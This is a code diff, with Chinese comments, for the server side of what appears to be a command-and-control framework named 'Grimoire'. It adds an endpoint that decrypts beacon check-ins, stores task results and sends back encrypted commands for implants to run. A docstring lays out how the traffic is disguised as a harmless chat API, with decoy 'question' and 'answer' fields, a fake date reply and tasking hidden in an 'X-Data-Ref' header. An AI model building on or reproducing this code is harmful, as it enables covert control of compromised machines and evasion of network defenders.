@@ -1,21 +1,22 @@
 # Beacon回连的地方
-
-from flask import Blueprint, request, jsonify
-from server.persistence.database import get_db_session
-from shared.CryptoManager import GrimoireCryptoManager
-from server.core.beacon_service import GrimoireBeaconService
-from server.core.task_service import GrimoireTaskService
-from cryptography.exceptions import InvalidTag
-import json
 import base64
+import json
+from flask import Blueprint, request, jsonify, current_app
 
-# 实例化服务
-crypto_mgr = GrimoireCryptoManager()
-beacon_service = GrimoireBeaconService(crypto_mgr=crypto_mgr)
-task_service = GrimoireTaskService()
+from server.persistence.database import get_db_session
 
 # 创建蓝图，URL 前缀为 /api/chat
 api_bp = Blueprint('chat_api', __name__, url_prefix='/api/chat')
+
+
+def get_services():
+    """从应用配置中获取所有共享的服务实例"""
+    app_config = current_app.config
+    return {
+        'crypto_mgr': app_config['CRYPTO_MANAGER'],
+        'beacon_service': app_config['BEACON_SERVICE'],
+        'task_service': app_config['TASK_SERVICE']
+    }
 
 
 def get_beacon_ip():
@@ -47,7 +48,9 @@ def initial_handshake():
     beacon_ip = get_beacon_ip()
     try:
         data = request.get_json()
-
+        services = get_services()
+        crypto_mgr = services['crypto_mgr']
+        beacon_service = services['beacon_service']
         # 密钥派生和 ID 生成
         beacon_public_key_b64 = data.get('hello')
         if not beacon_public_key_b64:
@@ -85,6 +88,71 @@ def initial_handshake():
 
 
 
+
+# 心跳包
+"""
+beacon如果是任务完成的返回，张下面这样
+{
+"task_id":id,
+"output":output
+}
+如果是请求任务，就
+{
+"action":"heartbeat"
+}
+
+
+加密后这样返回:
+{
+    "auth":加密后的payload,
+    "user":beacon读出来的用户名,
+    "question":随便
+}
+然后server的返回的任务张:
+{
+    "task_id": task.task_id,
+    "command": task.command,
+    "arguments": task.arguments
+}
+加密完放X-Data-Ref头里面。
+然后返回:
+X-Data-Ref:加密后的payload
+{
+"answer":"anaanan"
+}
+"""
+
+
 @api_bp.route('/send', methods=['POST'])
 def secure_communication():
-    return "Tomorrow"
+    services = get_services()
+    crypto_mgr = services['crypto_mgr']
+    task_service = services['task_service']
+
+    # 解密输入
+    payload = request.get_json().get('auth', '')
+    if not payload:
+        return jsonify({'error': 'Missing Authentication'}), 400
+    try:
+        plaintext_bytes, beacon_id = crypto_mgr.grimoire_decrypt(payload)
+    except Exception as e:
+        return jsonify({'error': 'Decryption/Authentication failed'}), 401
+
+    with get_db_session() as db:
+        # TaskService 处理一切，并返回格式化好地响应字典
+        response_data = task_service.process_and_get_task(
+            db=db,
+            beacon_id=beacon_id,
+            plaintext_bytes=plaintext_bytes
+        )
+
+    # 加密并返回
+    response_payload = json.dumps(response_data).encode('utf-8')
+    try:
+        encrypted_response = crypto_mgr.grimoire_encrypt(beacon_id, response_payload)
+        response =  jsonify({'Answer': "Today is 2025.11.21"})
+        response.headers['X-Data-Ref'] = encrypted_response
+        return response,200
+    except Exception as e:
+        print(f"Encryption failed for {beacon_id}: {e}")
+        return jsonify({'error': 'Internal encryption error'}), 500
